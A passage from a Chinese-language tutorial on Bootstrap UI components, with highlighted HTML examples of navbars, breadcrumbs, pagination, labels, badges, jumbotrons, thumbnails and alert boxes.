class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Message <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>通讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>响应式的导航栏</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-default"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbar-collapse"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>教育<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"navbar-collapse"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Message <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>通讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>导航栏中的表单</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"navbar-form navbar-right"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Search"</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>导航栏中的按钮   <code>navbar-btn</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default navbar-btn"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>导航栏中的文本    <code>navbar-text</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"navbar-text"</span>&gt;</span>Signed in as Thomas<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>固定到顶部、底部   <code>navbar-fixed-top</code>    <code>navbar-fixed-bottom</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-default navbar-fixed-top"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>教育<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Project<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Message <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>通讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>静态的顶部 <code>navbar-static-top</code></p>
</li>
<li>
<p>倒置的导航栏  带有黑色背景白色文本的倒置的导航栏    <code>navbar-inverse</code></p>
</li>
<li>
<p>面包屑导航</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>详情<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="八-分页-标签-徽章-巨幕-页头-缩略图-警告框组件"><a class="markdownIt-Anchor" href="#八-分页-标签-徽章-巨幕-页头-缩略图-警告框组件"></a> 八、分页、标签、徽章、巨幕、页头、缩略图、警告框组件</h4>
<hr />
<p><strong>分页</strong></p>
<ul>
<li>默认的分页</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>«<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>»<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>禁用和激活状态</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"disabled"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>«<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>»<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>分页的尺寸  <code>pagination-lg</code>    <code>pagination-sm</code></p>
</li>
<li>
<p>翻页（<code>Pager</code>）</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pager"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>previous<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>next<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对齐的链接</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pager"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"previous"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>← previous<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"next"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>next →<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可选的禁用状态</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pager"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"previous disabled"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>← previous<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"next"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>next →<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-default"</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-primary"</span>&gt;</span>Primary<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-success"</span>&gt;</span>Success<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-info"</span>&gt;</span>Info<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-warning"</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-danger"</span>&gt;</span>Danger<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>徽章<code>badge</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Messages <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge"</span>&gt;</span>20<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>Messages <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge"</span>&gt;</span>20<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>巨幕 <code>jumbotron</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"jumbotron"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello world!!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a simple hero unit, a simple jumbotron-style component for calling extra attention to featured</span><br><span class="line">            content or information.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Learn more<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>页头 <code>page-header</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Example page header</span><br><span class="line">  <span class="tag">&lt;<span class="name">small</span>&gt;</span>Subtext for header<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>缩略图</strong></p>
<ul>
<li>默认样式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-3 col-sm-6"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"thumbnail"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/kittens.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>自定义内容</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-3 col-sm-6"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"thumbnail"</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/kittens.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">	   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"caption"</span>&gt;</span>  <span class="comment">&lt;!--text-center--&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">h3</span>&gt;</span>缩略图标签<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">p</span>&gt;</span>一些示例文本。一些示例文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">role</span>=<span class="string">"button"</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">role</span>=<span class="string">"button"</span>&gt;</span>按钮 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>警告框</strong></p>
<ul>
<li>基本默认样式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-success"</span>&gt;</span>成功！很好地完成了提交。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-info"</span>&gt;</span>信息！请注意这个信息。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-warning"</span>&gt;</span>警告！请不要提交。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-danger"</span>&gt;</span>错误！请进行一些更改。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>可关闭的警告框<code>&lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;×&lt;/button&gt;</code></p>
</li>
<li>
<p>警告中的链接</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-success"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"alert-link"</span>&gt;</span>成功！很好地完成了提交。<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="九-进度条-媒体对象-列表组-面板-响应式插入组件"><a class="markdownIt-Anchor" href="#九-进度条-媒体对象-列表组-面板-响应式插入组件"></a> 九、进度条、媒体对象、列表组、面板、响应式插入组件</h4>
<hr />
<p><strong>进度条</strong></p>
<ul>
<li>默认的进度条</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>情景变化的进度条</li>
